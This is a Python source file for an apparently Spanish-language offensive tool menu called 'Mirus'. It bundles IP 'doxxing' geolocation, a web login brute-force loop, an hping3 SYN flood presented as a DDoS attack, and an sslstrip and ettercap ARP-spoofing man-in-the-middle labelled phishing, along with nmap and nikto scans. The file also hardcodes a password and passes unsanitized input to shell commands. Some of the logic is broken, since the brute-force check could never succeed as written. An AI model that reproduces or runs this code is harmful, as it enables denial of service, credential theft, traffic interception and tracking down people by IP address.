import os
import json
import urllib.request
import time
import requests

# Definir la key de seguridad
security_key = "MirusSecurity12345"

# Contador de intentos de autenticación
login_attempts = 0

# Archivo donde guardaremos las IPs
ip_file = "/storage/emulated/0/Download/MirusIPS.txt"

# Obtener la IP actual del dispositivo
current_ip = requests.get('https://api.ipify.org').text.strip()

# Verificar si la IP actual ya está en el archivo
try:
    with open(ip_file) as f:
        ips = f.read().strip().split('\n')
        if current_ip not in ips:
            # Agregar la IP actual al archivo
            with open(ip_file, 'a') as f:
                f.write(current_ip + '\n')
except FileNotFoundError:
    # El archivo no existe, así que lo creamos y agregamos la IP actual
    with open(ip_file, 'w') as f:
        f.write(current_ip + '\n')

def doxxear_ip(ip):
    # Agregamos la IP al archivo de IPs
    with open(ip_file, 'a') as f:
        f.write(ip + '\n')
    url = "http://ip-api.com/json/" + ip
    respuesta = urllib.request.urlopen(url)
    datos = json.loads(respuesta.read())
    print("\n[*] Informacion para la IP: " + ip + "\n")
    print("[+] Ciudad: " + datos['city'])
    print("[+] Region: " + datos['region'])
    print("[+] Pais: " + datos['country'])
    print("[+] ISP: " + datos['isp'])
    print("[+] Codigo postal: " + datos['zip'])
    print("[+] Latitud: " + str(datos['lat']))
    print("[+] Longitud: " + str(datos['lon']))
    print("[+] Zona horaria: " + datos['timezone'])
    time.sleep(10)
    os.system('clear')

def ping_website(website):
    response = os.system("ping -c 1 " + website)
    if response == 0:
        print("[+] La pagina " + website + " esta en linea")
    else:
        print("[-] La pagina " + website + " no esta en linea")
    time.sleep(10)
    os.system('clear')

def menu():            
    os.system('clear')
    print("             __  __ _                 ")
    print("            |  \/  (_)                ")
    print("            | \  / |_ _ __ _   _ ___ ")
    print("            | |\/| | | '__| | | / __|")
    print("            | |  | | | |  | |_| \__ \\")
    print("            |_|  |_|_|_|   \__,_|___/")
    print("")
    print("*******************************************************")
    print("*                                                     *")
    print("*                MENU PRINCIPAL                       *")
    print("*                                                     *")
    print("*******************************************************")
    print("*                                                     *")
    print("*    1) Doxxear IP                                    *")
    print("*    2) Ping de una pagina web                        *")
    print("*    3) Informacion del sistema operativo             *")
    print("*    4) Informacion de hardware del equipo            *")
    print("*    5) Revisar procesos en ejecucion                 *")
    print("*    6) Ver informacion de mi IP                       *")
    print("*    7) Escanear puertos                               *")
    print("*    8) Realizar un traceroute                         *")
    print("*    9) Ataque de fuerza bruta a un servicio web       *")
    print("*    10) Realizar un escaneo de red completo           *")
    print("*    11) Modificar el archivo hosts                    *")
    print("*    12) Realizar un escaneo de vulnerabilidades        *")
    print("*    13) Realizar un ataque DDoS                        *")
    print("*    14) Realizar un ataque de phishing                 *")
    print("*    15) Enviar un correo electronico de prueba        *")
    print("*                                                     *")
    print("*******************************************************")
    print("*                                                     *")
    print("*    16) SALIR                                        *")
    print("*                                                     *")
    print("*******************************************************")

def system_info():
    os.system('clear')
    print("  [*] Informacion del sistema operativo:\n")
    os.system('uname -a')
    time.sleep(10)
    os.system('clear')

def hardware_info():
    os.system('clear')
    print("  [*] Informacion del hardware del equipo:\n")
    os.system('lshw')
    time.sleep(10)
    os.system('clear')

def running_processes():
    os.system('clear')
    print("  [*] Procesos en ejecucion:\n")
    os.system('ps aux')
    time.sleep(10)
    os.system('clear')

def my_ip_info():
    url = "http://ip-api.com/json/"
    respuesta = urllib.request.urlopen(url)
    datos = json.loads(respuesta.read())
    print("\n[*] Informacion de tu IP:\n")
    print("[+] Ciudad: " + datos['city'])
    print("[+] Region: " + datos['region'])
    print("[+] Pais: " + datos['country'])
    print("[+] ISP: " + datos['isp'])
    print("[+] Codigo postal: " + datos['zip'])
    print("[+] Latitud: " + str(datos['lat']))
    print("[+] Longitud: " + str(datos['lon']))
    time.sleep(10)
    os.system('clear')

def scan_ports(ip):
    os.system('clear')
    print("[*] Escaneando puertos de la IP: " + ip)
    os.system('nmap ' + ip)
    time.sleep(10)
    os.system('clear')

def traceroute(ip):
    os.system('clear')
    print("  [*] Realizando traceroute a la IP: " + ip)
    os.system('traceroute ' + ip)
    time.sleep(10)
    os.system('clear')

def web_bruteforce(url, user_list, pass_list):
    os.system('clear')
    print("[*] Ataque de fuerza bruta a la URL: " + url)
    for user in user_list:
        for password in pass_list:
            response = os.system("curl -s -o /dev/null -w '%{http_code}' " + url + " -u " + user + ":" + password)
            if response == 200:
                print("[+] Credenciales encontradas: " + user + ":" + password)
                break
    time.sleep(10)
    os.system('clear')

def full_network_scan(ip):
    os.system('clear')
    print("[*] Escaneando toda la red desde la IP: " + ip)
    os.system('nmap -sn ' + ip + '/24')
    time.sleep(10)
    os.system('clear')

def modify_hosts():
    os.system('clear')
    print("[*] Modificando el archivo hosts")
    os.system('sudo nano /etc/hosts')
    time.sleep(10)
    os.system('clear')

def vulnerability_scan(url):
    os.system('clear')
    print("[*] Escaneando vulnerabilidades de la URL: " + url)
    os.system('nikto -h ' + url)
    time.sleep(10)
    os.system('clear')

def ddos_attack(ip):
    os.system('clear')
    print("[*] Realizando ataque DDoS a la IP: " + ip)
    os.system('hping3 -S -i u5000 -p 80 --flood ' + ip)
    time.sleep(10)
    os.system('clear')

def phishing_attack(url):
    os.system('clear')
    print("[*] Realizando ataque de phishing a la URL: " + url)
    os.system('sudo sslstrip')
    os.system('sudo ettercap -Tq -M arp:remote /' + url + '/ //')
    time.sleep(10)
    os.system('clear')

def send_email(subject, body, recipient):
    os.system('clear')
    print("[*] Enviando correo electronico de prueba")
    os.system('echo "' + body + '" | mail -s "' + subject + '" ' + recipient)
    time.sleep(10)
    os.system('clear')

def authentication():
    global login_attempts
    os.system('clear')
    print("*******************************************************")
    print("*                                                     *")
    print("*                MENU DE SEGURIDAD                     *")
    print("*                                                     *")
    print("*******************************************************")
    print("*                                                     *")
    if login_attempts < 3:
        key = input("*    Ingrese la key de seguridad: ")
        if key == security_key:
            print("*                                                     *")
            print("*******************************************************")
            time.sleep(1)
        else:
            login_attempts += 1
            print("*                                                     *")
            print("*    Key de seguridad incorrecta. Intentos restantes: ", 3 - login_attempts)
            print("*                                                     *")
            print("*******************************************************")
            time.sleep(1)
            authentication()
    else:
        print("*                                                     *")
        print("*    Ha excedido el limite de intentos. Intentelo en 1 minuto.")
        print("*                                                     *")
        print("*******************************************************")
        time.sleep(60)
        login_attempts = 0
        authentication()

def main():
    authentication()
    while True:
        menu()
        opcion = input("Ingrese la opcion deseada: ")
        if opcion == "1":
            ip = input("Ingrese la direccion IP: ")
            doxxear_ip(ip)
        elif opcion == "2":
            website = input("Ingrese el nombre de la pagina web: ")
            ping_website(website)
        elif opcion == "3":
            system_info()
        elif opcion == "4":
            hardware_info()
        elif opcion == "5":
            running_processes()
        elif opcion == "6":
            my_ip_info()
        elif opcion == "7":
            ip = input("Ingrese la direccion IP: ")
            scan_ports(ip)
        elif opcion == "8":
            ip = input("Ingrese la direccion IP: ")
            traceroute(ip)
        elif opcion == "9":
            url = input("Ingrese la URL del servicio web: ")
            user_list = input("Ingrese la ubicacion del archivo con los usuarios a probar: ")
            pass_list = input("Ingrese la ubicacion del archivo con las contraseñas a probar: ")
            with open(user_list, 'r') as f:
                users = f.read().splitlines()
            with open(pass_list, 'r') as f:
                passwords = f.read().splitlines()
            web_bruteforce(url, users, passwords)
        elif opcion == "10":
            ip = input("Ingrese la direccion IP: ")
            full_network_scan(ip)
        elif opcion == "11":
            modify_hosts()
        elif opcion == "12":
            url = input("Ingrese la URL a escanear: ")
            vulnerability_scan(url)
        elif opcion == "13":
            ip = input("Ingrese la direccion IP: ")
            ddos_attack(ip)
        elif opcion == "14":
            url = input("Ingrese la URL a atacar: ")
            phishing_attack(url)
        elif opcion == "15":
            subject = input("Ingrese el asunto del correo: ")
            body = input("Ingrese el contenido del correo: ")
            recipient = input("Ingrese el correo electrónico del destinatario: ")
            send_email(subject, body, recipient)
        elif opcion == "16":
            print("\n[*] Saliendo del programa...")
            break
        else:
            input("\n[-] Opcion invalida. Presione ENTER para continuar...")

if __name__ == "__main__":
    main()
